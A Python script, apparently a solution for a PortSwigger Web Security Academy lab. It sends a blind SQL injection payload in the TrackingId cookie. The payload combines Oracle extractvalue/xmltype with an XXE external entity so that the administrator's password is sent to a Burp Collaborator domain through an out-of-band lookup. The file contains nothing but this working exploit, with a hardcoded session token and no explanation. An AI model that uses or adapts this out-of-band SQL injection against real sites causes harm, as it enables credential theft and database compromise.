import requests
import urllib
import string

endpoint = "https://ac541f521f1cc1dac0497752000d00f6.web-security-academy.net/"
delay = 20

def sqli(payload):

    encoded_payload = urllib.parse.quote_plus(payload)
    headers = {
        'Cookie': f"session=oa92Qn7RebKNAAkENShc0nBg75eEYzxD;TrackingId=test{encoded_payload}"
    }
    print(headers)

    response = requests.get(endpoint, headers=headers)


def main():

    subdomain = "'||(SELECT password FROM users WHERE username='administrator')||'.turles1wm6zo0klgzw0ex9ygh7nxbm.burpcollaborator.net"
    payload = f"test' UNION (SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{subdomain}/\"> %remote;]>'),'/l') FROM dual)-- "
    sqli(payload)


if __name__ == '__main__':
    main()
